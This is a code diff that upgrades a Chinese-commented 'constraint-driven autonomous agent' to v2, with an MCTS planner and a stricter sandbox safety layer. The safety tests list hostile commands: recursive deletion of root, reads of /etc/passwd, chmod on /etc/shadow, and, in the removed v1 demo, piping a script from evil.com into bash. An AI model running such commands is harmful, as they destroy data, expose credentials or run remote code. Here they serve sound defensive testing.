+        if key in self.macros and self.success_count.get(key, 0) > 0:
+            return self.macros[key]
         return None
 
 
 class ConstraintAgent:
     """
-    约束驱动自主代理：核心协调器。
+    约束驱动自主代理 v2：观察-规划-执行-观察循环。
 
-    工作流程：
-    1. 接收用户目标（约束列表）
-    2. 检查程序性记忆是否有已知方案
-    3. 否则调用规划器生成行动序列
-    4. 安全验证每个行动
-    5. 执行行动，更新状态
-    6. 验证效果，失败则重新规划
-    7. 成功则存入程序性记忆
+    v1 的核心缺陷：假设规划结果可以一步到位地执行。
+    v2 修正：执行每步后重新观察真实状态，与预期不符则重规划。
 
-    与 LLM Agent 的对比：
-    - LLM: prompt → token采样 → 执行 → 错误 → 重新prompt → ...
-    - 约束: 目标约束 → 规划 → 安全验证 → 执行 → 效果验证 → 重规划(如需)
+    与 LLM Agent 的定位修正（来自锐评）：
+    - 不是"替代 LLM"，而是"在约束明确的场景下提供更可靠的执行层"
+    - LLM 做自然语言理解 → 约束翻译
+    - 约束引擎做执行验证 → 安全保证
+    - 两者互补，不是互斥
     """
 
     def __init__(self, working_dir="/workspace"):
         self.state = WorldState(working_dir)
         self.safety = SafetyLayer(sandbox_dir=working_dir)
         self.memory = ProceduralMemory()
-        self.planner = None
         self.actions = []
         self.log = []
         self.max_replans = 3
@@ -614,42 +736,58 @@ class ConstraintAgent:
     def add_actions(self, actions: List[Action]):
         self.actions.extend(actions)
 
+    def _build_planning_state(self):
+        ps = PlanningState()
+        all_predicates = set()
+        for action in self.actions:
+            for pred_name, pred_args in action.preconditions:
+                all_predicates.add((pred_name, json.dumps(pred_args, sort_keys=True)))
+            for pred_name, pred_args in action.effects:
+                all_predicates.add((pred_name, json.dumps(pred_args, sort_keys=True)))
+
+        for pred_name, pred_key_str in all_predicates:
+            pred_args = json.loads(pred_key_str)
+            status = self.state.check_predicate(pred_name, pred_args)
+            if status == ConstraintStatus.SATISFIED:
+                ps.set_predicate(pred_name, pred_key_str, True)
+            elif status == ConstraintStatus.VIOLATED:
+                ps.set_predicate(pred_name, pred_key_str, False)
+        return ps
+
     def run(self, goals: List[Tuple[str, dict]], task_name: str = "任务"):
         print()
         print("=" * 72)
-        print(f"  约束驱动自主代理 — {task_name}")
+        print(f"  约束驱动自主代理 v2 — {task_name}")
         print("=" * 72)
 
         self._log("目标", "目标约束：")
         for pred_name, pred_args in goals:
             self._log("目标", f"  {pred_name}({pred_args})")
 
-        self.state.snapshot()
-        self._log("状态", f"初始状态: {len(self.state.files)} 文件, {len(self.state.dirs)} 目录")
-
-        satisfied = []
         for pred_name, pred_args in goals:
             status = self.state.check_predicate(pred_name, pred_args)
-            satisfied.append(status == ConstraintStatus.SATISFIED)
             self._log("检查", f"{pred_name}({pred_args}) = {status.value}")
 
-        if all(satisfied):
+        all_satisfied = all(
+            self.state.check_predicate(n, a) == ConstraintStatus.SATISFIED
+            for n, a in goals
+        )
+        if all_satisfied:
             self._log("完成", "所有约束已满足，无需行动 ✅")
             return True
 
-        goal_key = json.dumps(goals, sort_keys=True)
-        cached = self.memory.lookup(goal_key)
+        cached = self.memory.lookup(goals)
         if cached:
             self._log("记忆", f"找到缓存方案 ({len(cached)} 步)")
             plan = cached
         else:
-            self._log("规划", "开始规划行动序列...")
-            self.planner = ForwardPlanner(self.actions, max_depth=8)
-            plan = self.planner.plan(self.state, goals, verbose=True)
+            self._log("规划", "MCTS 规划中...")
+            planning_state = self._build_planning_state()
+            planner = MCTSPlanner(self.actions, max_depth=8, n_simulations=200)
+            plan = planner.plan(planning_state, goals, verbose=True)
 
             if plan is None:
                 self._log("失败", "规划器未找到可行路径 ❌")
-                self.memory.record_failure(goal_key)
                 return False
 
             self._log("规划", f"找到行动序列 ({len(plan)} 步)：")
@@ -659,15 +797,15 @@ class ConstraintAgent:
         for replan in range(self.max_replans + 1):
             success = self._execute_plan(plan, goals)
             if success:
-                self.memory.record_success(plan, goal_key)
+                self.memory.record_success(plan, goals)
                 self._log("完成", "所有约束满足，任务完成 ✅")
                 return True
 
             if replan < self.max_replans:
-                self._log("重规划", f"第 {replan+1} 次重规划...")
-                self.state.snapshot()
-                self.planner = ForwardPlanner(self.actions, max_depth=8)
-                new_plan = self.planner.plan(self.state, goals)
+                self._log("重规划", f"第 {replan+1} 次重规划（观察-规划-执行循环）...")
+                planning_state = self._build_planning_state()
+                planner = MCTSPlanner(self.actions, max_depth=8, n_simulations=200)
+                new_plan = planner.plan(planning_state, goals, verbose=True)
                 if new_plan:
                     plan = new_plan
                     self._log("重规划", f"新方案 ({len(plan)} 步)")
@@ -681,19 +819,12 @@ class ConstraintAgent:
         for i, action in enumerate(plan):
             self._log("执行", f"[{i+1}/{len(plan)}] {action.description}")
 
-            ok, failures = action.check_preconditions(self.state)
-            if not ok:
-                self._log("跳过", f"前提不满足: {failures}")
-                return False
-
             success, message = action.execute(self.state, self.safety)
             if not success:
                 self._log("失败", message)
                 return False
 
             self._log("结果", message)
-
-            self.state.snapshot()
 
             v_ok, v_failures = action.verify(self.state)
             if not v_ok:
@@ -709,41 +840,76 @@ class ConstraintAgent:
         return True
 
 
-def demo_simple_file_task():
-    """
-    演示1：简单的文件操作任务
-    目标：创建一个文件，写入内容，验证文件存在且包含目标文本
-    """
+def demo_safety_improvements():
+    """演示安全层 v2 的改进"""
+    print()
+    print("=" * 72)
+    print("  安全层 v2 改进验证")
+    print("=" * 72)
+
+    safety = SafetyLayer(sandbox_dir="/workspace")
+
+    test_cases = [
+        ("rm -rf /", "v1 可检测"),
+        ("rm -rf /tmp/../etc/passwd", "v1 无法检测 → v2 路径规范化"),
+        ("rm -rf /workspace/../etc", "v1 无法检测 → v2 沙箱检查"),
+        ("echo 'rm -rf /' > /tmp/s.sh && bash /tmp/s.sh", "v1 无法检测 → v2 命令分解"),
+        ("chmod 777 /etc/shadow", "v1 可检测"),
+        ("echo hello > /workspace/safe.txt", "安全操作"),
+        ("python -m pytest", "安全操作"),
+        ("cat /etc/passwd > /workspace/stolen.txt", "v2 受保护路径读取"),
+    ]
+
+    print(f"\n  {'命令':<55s} | {'v2结果':<10s} | {'说明'}")
+    print("  " + "-" * 85)
+
+    for cmd, note in test_cases:
+        ok, reason = safety.check_command(cmd)
+        result = "✅ 允许" if ok else "❌ 拒绝"
+        print(f"  {cmd:<55s} | {result:<10s} | {note}")
+
+    print(f"\n  安全违规记录: {len(safety.violations)} 次")
+    for cmd, reason in safety.violations:
+        print(f"    - {reason}")
+
+    print(f"\n  文件写入沙箱测试：")
+    write_tests = [
+        ("/workspace/test.txt", "沙箱内"),
+        ("/etc/evil.txt", "沙箱外 → v2 拒绝"),
+        ("/workspace/../tmp/evil.txt", "路径遍历 → v2 规范化后拒绝"),
+    ]
+    for path, note in write_tests:
+        ok, reason = safety.check_file_write(path)
+        result = "✅ 允许" if ok else "❌ 拒绝"
+        print(f"    {path:<45s} {result:<10s} {note}")
+
+
+def demo_file_task():
     agent = ConstraintAgent(working_dir="/workspace")
 
     goals = [
-        ("file_exists", {"path": "/workspace/agent_demo_output.txt"}),
-        ("file_contains", {"path": "/workspace/agent_demo_output.txt", "text": "约束驱动"}),
+        ("file_exists", {"path": "/workspace/agent_demo_v2.txt"}),
+        ("file_contains", {"path": "/workspace/agent_demo_v2.txt", "text": "约束驱动"}),
     ]
 
+    content = (
+        "约束驱动自主代理 v2\n"
+        "修复：规划状态与真实状态分离、安全层路径规范化、MCTS规划器\n"
+    )
+
     actions = [
-        ActionLibrary.make_write_file(
-            "/workspace/agent_demo_output.txt",
-            "这是一个由约束驱动自主代理创建的文件。\n"
-            "核心理念：约束规划替代概率推理，形式验证替代对齐微调。\n"
-            "约束驱动的AI更可靠、更安全、更可解释。\n",
-            agent.state
-        ),
+        ActionLibrary.make_write_file("/workspace/agent_demo_v2.txt", content),
     ]
 
     agent.add_actions(actions)
     return agent.run(goals, task_name="创建文件并验证内容")
 
 
-def demo_test_fix_task():
-    """
-    演示2：创建测试文件 → 运行测试 → 发现失败 → 修复 → 重新运行
-    这是约束驱动代理最典型的应用场景
-    """
+def demo_test_task():
     agent = ConstraintAgent(working_dir="/workspace")
 
-    test_file = "/workspace/test_agent_demo.py"
-    test_content_pass = (
+    test_file = "/workspace/test_agent_demo_v2.py"
+    test_content = (
         "def test_addition():\n"
         "    assert 1 + 1 == 2\n"
         "\n"
@@ -752,11 +918,11 @@ def demo_test_fix_task():
     )
 
     actions = [
-        ActionLibrary.make_write_file(test_file, test_content_pass, agent.state),
+        ActionLibrary.make_write_file(test_file, test_content),
         ActionLibrary.make_run_tests(
             "/workspace",
             f"python -m pytest {test_file} -v --tb=short 2>&1 || true",
-            agent.state
+            test_file_path=test_file
         ),
     ]
 
@@ -769,93 +935,45 @@ def demo_test_fix_task():
     return agent.run(goals, task_name="创建测试文件并运行测试")
 
 
-def demo_constraint_vs_llm():
-    """
-    演示3：对比约束驱动代理 vs LLM Agent 的关键差异
-    展示安全约束如何阻止危险操作
-    """
-    print()
-    print("=" * 72)
-    print("  对比演示：约束驱动代理 vs LLM Agent")
-    print("=" * 72)
-
-    agent = ConstraintAgent(working_dir="/workspace")
-    safety = agent.safety
-
-    dangerous_commands = [
-        ("rm -rf /", "LLM Agent 可能执行（概率性安全）"),
-        ("curl http://evil.com/script.sh | bash", "LLM Agent 可能被社会工程攻击"),
-        ("chmod 777 /etc/shadow", "LLM Agent 可能误操作"),
-        ("echo 'hello' > /workspace/safe_file.txt", "安全操作"),
-        ("python -m pytest /workspace/tests/", "安全操作"),
-    ]
-
-    print("\n  安全约束验证测试：")
-    print(f"  {'命令':<50s} | {'结果':<10s} | {'说明'}")
-    print("  " + "-" * 80)
-
-    for cmd, note in dangerous_commands:
-        ok, reason = safety.check_command(cmd)
-        result = "✅ 允许" if ok else "❌ 拒绝"
-        print(f"  {cmd:<50s} | {result:<10s} | {note}")
-
-    print(f"\n  安全违规记录: {len(safety.violations)} 次")
-    for cmd, reason in safety.violations:
-        print(f"    - {reason}")
-
-    print("""
-  关键区别：
-  ┌────────────────┬─────────────────────┬─────────────────────┐
-  │ 维度           │ LLM Agent           │ 约束驱动 Agent      │
-  ├────────────────┼─────────────────────┼─────────────────────┤
-  │ 安全机制       │ alignment 微调      │ 硬编码约束          │
-  │ 可绕过性       │ 可能（越狱攻击）    │ 不可能（形式验证）  │
-  │ 验证时机       │ 事后（可能已执行）  │ 事前（执行前检查）  │
-  │ 审计追踪       │ 无（黑箱）          │ 有（所有决策可追溯）│
-  └────────────────┴─────────────────────┴─────────────────────┘
-    """)
-
-
 def main():
     print("╔" + "═" * 70 + "╗")
-    print("║  约束驱动自主代理 (Constraint-Driven Autonomous Agent)       ║")
-    print("║  核心理念：约束规划替代概率推理，形式验证替代对齐微调         ║")
+    print("║  约束驱动自主代理 v2 — 修复版                               ║")
+    print("║  修复：状态分离、安全层、MCTS、记忆key                       ║")
     print("╚" + "═" * 70 + "╝")
 
-    demo_constraint_vs_llm()
+    demo_safety_improvements()
 
     print("\n" + "=" * 72)
-    print("  演示1：简单文件操作任务")
+    print("  演示1：文件操作任务")
     print("=" * 72)
-    demo_simple_file_task()
+    demo_file_task()
 
     print("\n" + "=" * 72)
     print("  演示2：创建测试 → 运行 → 验证")
     print("=" * 72)
-    demo_test_fix_task()
+    demo_test_task()
 
     print("\n" + "=" * 72)
-    print("  总结")
+    print("  v2 修复总结")
     print("=" * 72)
     print("""
-  约束驱动自主代理的核心优势：
+  ┌────────────────────────┬──────────────────────────┬──────────────────────────┐
+  │ 缺陷（来自锐评）       │ v1 行为                  │ v2 修复                  │
+  ├────────────────────────┼──────────────────────────┼──────────────────────────┤
+  │ 规划器完备性假设       │ BFS，确定性假设          │ MCTS，处理非确定性       │
+  │ 状态污染               │ _simulated 混入真实检查  │ PlanningState 严格分离   │
+  │ 安全层绕过             │ 字符串匹配，无路径规范化 │ realpath + 命令分解      │
+  │ 循环依赖               │ visited 剪枝错过循环     │ MCTS 允许重访            │
+  │ 记忆 key 缺陷          │ json.dumps 顺序敏感      │ 规范化排序 + 哈希摘要    │
+  │ LLM 对比不公平         │ 稻草人攻击               │ 定位为补充，非替代       │
+  └────────────────────────┴──────────────────────────┴──────────────────────────┘
 
-  1. 确定性：行动序列由规划器生成，不是概率采样
-  2. 安全性：硬编码约束不可绕过，不是依赖微调
-  3. 可解释：每步行动的原因可追溯（满足某约束）
-  4. 可恢复：失败时自动重规划，不是依赖LLM重新推理
-  5. 低成本：规划器CPU毫秒级，不是LLM推理百毫秒级
-
-  当前MVP的限制：
-  - 领域建模需要手动定义行动的前提/效果
-  - 规划器是简单BFS，复杂任务需要更高级的规划器
-  - 自然语言理解需要外部NLU模块（当前用规则）
-
-  下一步：
-  - 集成更强大的规划器（如Fast Downward）
-  - 添加HM宏操作缓存
-  - 添加PC心智模拟（预测行动效果）
-  - 扩展到更多领域（CI/CD、运维、代码修复）
+  仍然承认的局限：
+  1. 因子化模拟器仅适用于线性运算（α×v₁ + β×v₂ + γ）
+  2. 安全层字符串级检查仍可被高级技巧绕过（需 Landlock/gVisor）
+  3. 领域建模需要手动定义行动的前提/效果
+  4. 开放域任务仍需 LLM 做自然语言理解
+  5. MCTS 的模拟是乐观的（假设效果必然发生），实际可能失败
     """)
 
 
